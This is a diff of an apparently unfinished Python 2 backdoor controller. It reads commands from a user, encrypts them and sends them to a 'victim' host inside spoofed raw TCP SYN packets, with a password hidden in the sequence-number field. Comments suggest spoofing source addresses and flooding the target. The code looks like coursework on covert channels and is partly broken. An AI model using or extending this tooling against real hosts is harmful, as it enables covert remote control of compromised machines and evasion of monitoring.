@@ -81,12 +81,22 @@ def checksum(msg):
 
 	return s
 
+def string_bin(string):
+    return ''.join(format(ord(c), 'b') for c in string)
 
 
 
+def getCmd():
+	protocol = ""
+	while True:
+		#get protocol from user
 
-def getCmd(dstIP, srcIP, dstPort):
-	while True: 
+		while protocol == "":
+			protocol = raw_input("Enter protocol to use: TCP or UDP ")
+			if (protocol != "TCP" and protocol != "UDP"):
+				break
+
+
 		cmd = raw_input("Enter a command: ")
 
 		if cmd =="exit":
@@ -105,84 +115,100 @@ def getCmd(dstIP, srcIP, dstPort):
 			print "Decypted command with wrong password: "+badDecrypt(encryptedCmd)
 			print "Decrypted command with correct password: "+decrypt(encryptedCmd)
 			#encrypt the command
+			'''
+			password = encrypt("pass")
+			#convert password to binary
+			password = string_bin(password)
+			'''
 			#create a packet to send to the victim
-			#http://www.binarytides.com/raw-socket-programming-in-python-linux/
+			sendCommand(protocol, encryptedCmd, 1000)
 
-			# create a raw socket
-			try:
-				s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-			except socket.error, msg:
-				print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
-				sys.exit()
 
-			# ip header fields
-			ip_ihl = 5
-			ip_ver = 4
-			ip_tos = 0
-			ip_tot_len = 0  # kernel will fill the correct total length
-			ip_id = 54321  # Id of this packet
-			ip_frag_off = 0
-			ip_ttl = 144
-			ip_proto = socket.IPPROTO_TCP
-			ip_check = 0  # kernel will fill the correct checksum
-			ip_saddr = socket.inet_aton(srcIP)  # Spoof the source ip address if you want to
-			ip_daddr = socket.inet_aton(dstIP)
 
-			ip_ihl_ver = (ip_ver << 4) + ip_ihl
+def sendCommand(protocol, data, password):
+	# http://www.binarytides.com/raw-socket-programming-in-python-linux/
 
-			# the ! in the pack format string means network order
-			ip_header = pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto,
-							 ip_check, ip_saddr, ip_daddr)
+	# create a raw socket
+	try:
+		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+	except socket.error, msg:
+		print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
+		sys.exit()
 
-			# tcp header fields
-			tcp_source = 1234  # source port
-			tcp_dest = 80  # destination port
-			tcp_seq = 454
-			tcp_ack_seq = 0
-			tcp_doff = 5  # 4 bit field, size of tcp header, 5 * 4 = 20 bytes
-			# tcp flags
-			tcp_fin = 0
-			tcp_syn = 1
-			tcp_rst = 0
-			tcp_psh = 0
-			tcp_ack = 0
-			tcp_urg = 0
-			tcp_window = socket.htons(5840)  # maximum allowed window size
-			tcp_check = 0
-			tcp_urg_ptr = 0
+	# ip header fields
+	ip_ihl = 5
+	ip_ver = 4
+	ip_tos = 0
+	ip_tot_len = 0  # kernel will fill the correct total length
+	ip_id = 54321  # Id of this packet
+	ip_frag_off = 0
+	ip_ttl = 144
+	ip_proto = socket.IPPROTO_TCP
+	ip_check = 0  # kernel will fill the correct checksum
+	ip_saddr = socket.inet_aton(srcIP)  # Spoof the source ip address if you want to
+	ip_daddr = socket.inet_aton(dstIP)
 
-			tcp_offset_res = (tcp_doff << 4) + 0
-			tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
+	ip_ihl_ver = (ip_ver << 4) + ip_ihl
 
-			# the ! in the pack format string means network order
-			tcp_header = pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,
-							  tcp_window, tcp_check, tcp_urg_ptr)
+	# the ! in the pack format string means network order
+	ip_header = pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto,
+					 ip_check, ip_saddr, ip_daddr)
 
-			user_data = 'Hello, how are you'
 
-			# pseudo header fields
-			source_address = socket.inet_aton(srcIP)
-			dest_address = socket.inet_aton(dstIP)
-			placeholder = 0
-			protocol = socket.IPPROTO_TCP
-			tcp_length = len(tcp_header) + len(user_data)
+	if(protocol == "TCP"):
+		# tcp header fields
+		tcp_source = 1234  # source port
+		tcp_dest = 80  # destination port
+		#put password to seq
+		tcp_seq = password
+		tcp_ack_seq = 0
+		tcp_doff = 5  # 4 bit field, size of tcp header, 5 * 4 = 20 bytes
+		# tcp flags
+		tcp_fin = 0
+		tcp_syn = 1
+		tcp_rst = 0
+		tcp_psh = 0
+		tcp_ack = 0
+		tcp_urg = 0
+		tcp_window = socket.htons(5840)  # maximum allowed window size
+		tcp_check = 0
+		tcp_urg_ptr = 0
 
-			psh = pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length);
-			psh = psh + tcp_header + user_data;
+		tcp_offset_res = (tcp_doff << 4) + 0
+		tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
 
-			tcp_check = checksum(psh)
+		# the ! in the pack format string means network order
+		tcp_header = pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,
+						  tcp_window, tcp_check, tcp_urg_ptr)
 
-			# print tcp_checksum
 
-			# make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
-			tcp_header = pack('!HHLLBBH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,
-							  tcp_window) + pack('H', tcp_check) + pack('!H', tcp_urg_ptr)
 
-			# final full packet - syn packets dont have any data
-			packet = ip_header + tcp_header + user_data
+		# pseudo header fields
+		source_address = socket.inet_aton(srcIP)
+		dest_address = socket.inet_aton(dstIP)
+		placeholder = 0
+		protocol = socket.IPPROTO_TCP
+		tcp_length = len(tcp_header) + len(data)
 
-			# Send the packet finally - the port specified has no effect
-			s.sendto(packet, (dstIP, 0))  # put this in a loop if you want to flood the target
+		psh = pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length);
+		psh = psh + tcp_header + data;
+
+		tcp_check = checksum(psh)
+
+		# print tcp_checksum
+
+		# make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
+		tcp_header = pack('!HHLLBBH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,
+						  tcp_window) + pack('H', tcp_check) + pack('!H', tcp_urg_ptr)
+
+		# final full packet - syn packets dont have any data
+		packet = ip_header + tcp_header + data
+
+	if (protocol == "UDP"):
+		print "create UDP header"
+
+	# Send the packet finally - the port specified has no effect
+	s.sendto(packet, (dstIP, 0))  # put this in a loop if you want to flood the target
 
 
 
@@ -191,7 +217,7 @@ def getCmd(dstIP, srcIP, dstPort):
 def main():
 	checkRoot()
 
-	cmdThread = threading.Thread(target=getCmd, args=(dstIP, srcIP, dstPort))
+	cmdThread = threading.Thread(target=getCmd)
 	#fileThread = threading.Thread(target=getFile, args=(dstIP, srcIP, dstPort))
 	
 	cmdThread.start()
